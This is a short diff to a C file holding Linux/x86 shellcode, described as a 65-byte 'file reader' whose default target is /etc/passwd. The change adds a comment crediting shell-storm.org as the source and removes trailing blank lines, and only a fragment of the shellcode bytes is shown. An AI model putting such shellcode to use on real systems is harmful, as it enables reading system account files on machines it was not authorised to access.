@@ -1,4 +1,7 @@
 /*
+Source: http://shell-storm.org/shellcode/files/shellcode-73.php
+*/
+/*
 Linux/x86 file reader.
 
 65 bytes + pathname
@@ -62,8 +65,3 @@ char main[]=
 "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
 "\xff"
 "/etc/passwd"; //Put here the file path, default is /etc/passwd
-
-
-
-
-
